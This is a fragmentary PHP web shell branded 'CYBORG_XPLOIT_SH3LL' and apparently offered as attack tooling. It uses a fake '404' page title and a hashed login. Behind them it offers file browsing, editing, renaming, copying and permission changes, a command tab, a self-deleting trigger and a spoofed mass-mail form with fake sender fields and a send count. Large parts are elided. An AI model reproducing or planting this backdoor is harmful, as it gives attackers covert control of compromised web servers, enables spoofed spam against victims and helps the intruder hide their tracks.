...
error_reporting(0);
@session_start();
$username = "64fc0802fbae681ee55a9a4b87f0aec7"; //
$password = "64fc0802fbae681ee55a9a4b87f0aec7"; //
if (isset($_POST['user'])) {
...
if ($_SESSION['login'] == 1) {
    ...
    function creditos() {
        ...
        echo "<fieldset><center>-- == &copy; Cyborg Xploit 2022 || Mail to : cyborgxploit@protonmail.com || Blog : privacy1337.blogspot.com == --</center></fieldset>";
        exit(1);
    }
...
a:hover {
	...
	transition:0.6s;
	opacity:0.9;
	text-shadow:0px 0px 6px #8500FF;
	}
</style>';
    echo "<title>" . $_SERVER["SERVER_NAME"] . " - 404</title>";
    ...
    echo "<center><table><tr><td class=main><br><h2><td class=main><a href=?>&nbsp;&nbsp;&nbsp;CYBORG_XPLOIT_SH3LL | H4X0R_&nbsp;&nbsp;&nbsp;</a></td></h2><br></td><td class=main>
...
<center>
<table>
<td class=main><a href=?dir=>&nbsp;Files&nbsp;</a></td><td class=main><a href=?cmd=>&nbsp;CMD&nbsp;</a></td>
...
";
    ...
    if (isset($_POST['cambiarperms'])) {
        ...
        echo "<br><br><font color=red><center><a href=?reload=" . urlencode($_POST['archivo']) . ">Success</a><br><br></font>
";
    }
    if (isset($_GET['ren'])) {
        echo "
...
";
    ...
    if (isset($_POST['cambios'])) {
        ...
        echo "<br><br><font color=red><center><a href=?reload=" . urlencode($_POST['cambios']) . ">Success</a><br><br></font></center>";
    }
...
';
    ...
    if (isset($_POST['copiado'])) {
        ...
        echo "<br><br><font color=red><center><a href=?reload=" . urlencode($_POST['archivo']) . ">Success</a><br><br></font></center>";
    }
    if (isset($_GET['open'])) {
        echo "<form action='' method=POST>";
        echo "<center>";
    ...
    if (isset($_POST['modificar'])) {
        ...
        echo "<br><br><font color=red><center><a href=?reload=" . urlencode($_GET['open']) . ">Success</a><br><br></font></center>";
    }
...
";
        ...
        echo "<table bgcolor=aqua border=1>";
        echo "<td width=350>Name</td><td width=350>Type</td><td width=350>Modification time</td>";
        echo "<td width=350>Permission</td><td width=350>Action</td>";
        echo "<tr>";
...
";
    ...
    if (isset($_GET['chau'])) {
        if ($_GET['chau'] == "fuckit") {
            ...
            unlink(basename($_SERVER['PHP_SELF'])); //wkwkwk
            
        } else {
            echo "<br><br><font color=red><h3><center>Ora iso mas :(</center></h3></font><br><br>";
        }
    }
...
<form action='' method=POST>
<center><table border=1>
<td>Target : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=idiot value=manusia@gmail.com.com size=44><tr>
<td>FakeMail : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=falso value=emailfake@gmail.com size=44><tr>
<td>FakeName : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=nombrefalso value=Hengker size=44><tr>
<td>ListMails : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=listamails value=None size=44><tr>
<td>Subjects : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=asunto value=Halo size=44><tr>
<td>Count : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=count value=10 size=44><tr>
<td>Body : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><textarea name=mensaje rows=7 cols=40>Awokwok</textarea></td><tr>
</table><br><br>
...
<select name=op>
<option>Delete</option>
</select>&nbsp;&nbsp;<input type=submit name=furia value=Success></form>";
        } else {
